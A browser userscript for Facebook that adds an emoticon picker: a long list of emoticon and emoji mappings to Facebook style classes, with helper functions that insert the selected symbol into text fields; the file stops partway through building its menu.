// ==UserScript==
// @name            Fb Cool By @adibPN
// @description     All about facebook By Adib Pugar Nuraga
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==============
// === Facebook Themes, Emoticons, Profile Views By Adib Pugar Nuraga ====
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
